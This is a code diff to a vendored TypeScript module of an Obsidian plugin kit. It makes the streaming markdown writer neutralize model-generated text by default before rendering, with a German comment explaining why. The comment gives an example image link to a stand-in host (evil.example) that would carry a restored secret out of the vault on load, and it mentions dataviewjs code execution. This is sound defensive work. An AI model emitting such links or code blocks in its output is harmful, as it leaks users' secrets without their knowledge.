@@ -1,4 +1,5 @@
-// vendored from obsidian-kit@0.46.0, src/obsidian/stable-writer.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
+// vendored from obsidian-kit@0.51.2, src/obsidian/stable-writer.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
+import { neutralizeModelMarkdown } from "../kit/safe-markdown";
 import { splitStable } from "../kit/stream-blocks";
 import type { StreamArea } from "./stream-area";
 
@@ -32,6 +33,22 @@ import type { StreamArea } from "./stream-area";
  * Nur die Push-Bauart mit Markdown-Anspruch. Wer Rohtext anhängt oder aus einem Snapshot
  * `slice(-N)` setzt, nimmt `StreamArea` allein — der Schreiber wäre dort Ballast.
  *
+ * ## Neutralisierung (Default seit 0.51.0)
+ *
+ * Jeder Abschnitt geht durch `neutralizeModelMarkdown`, bevor er an `render` geht. Grund: ein
+ * Modell-Text läuft sonst durch ALLE Codeblock-Prozessoren des Vaults (```dataviewjs führt Code
+ * aus), und Bilder laden von selbst — mit einer Wiederherstellung geschwärzter Werte (`redact`)
+ * trüge `![x](https://evil.example/?d=<Original>)` das Geheimnis ohne Klick hinaus. Das ist chunkweise
+ * sicher, weil `splitStable` nur außerhalb offener Fences schneidet; die Funktion ist idempotent.
+ * Folge für die Darstellung: Codeformatierung in Antworten geht verloren (siehe `safe-markdown`).
+ * `raw: true` schaltet das ab — nur mit Begründung im Konsumenten, die dort im Code steht.
+ *
+ * Grenzen: Der Schreiber deckt nur SEINEN Render-Weg ab. Ein Konsument, der Modell-Text direkt an
+ * `MarkdownRenderer` gibt (Hauptansicht, Verlauf, Notiz-Vorschau), ruft `neutralizeModelMarkdown`
+ * selbst (das Kit re-exportiert sie). `raw()` liefert den Rohstrom UNneutralisiert — wer ihn
+ * rendert oder speichert, neutralisiert vorher. Der Fallback bei einem Render-Fehler setzt den
+ * Text per `setText` (Text, kein Markdown) und ist damit unkritisch.
+ *
  * Herkunft: `koda-agent/src/obsidian/view.ts` (`streamToken`, 0.8.0), zweite Fassung
  * `lingotuner/src/obsidian/view.ts:247`.
  */
@@ -42,6 +59,8 @@ export interface StableWriterOptions {
   render: (el: HTMLElement, markdown: string) => Promise<void>;
   /** Klasse je stabilem Block. Default `okit-stream-block`. */
   blockCls?: string;
+  /** `true` reicht den Roh-Text an `render` (keine Neutralisierung). Nur mit Begründung im Konsumenten. */
+  raw?: boolean;
 }
 
 export interface StableMarkdownWriter {
@@ -80,7 +99,7 @@ export function createStableWriter(opts: StableWriterOptions): StableMarkdownWri
         const fresh = stable.slice(stableLen);
         stableLen = stable.length;
         const blockEl = area.bodyEl.createDiv({ cls: blockCls });
-        const p = opts.render(blockEl, fresh).catch(() => { blockEl.setText(fresh); });
+        const p = opts.render(blockEl, opts.raw ? fresh : neutralizeModelMarkdown(fresh)).catch(() => { blockEl.setText(fresh); });
         pending.push(p);
         // Der laufende Absatz gehört immer ans Ende: `createDiv` hängt den frischen Block
         // hinter den Tail, also wandert der Tail danach wieder dahinter.
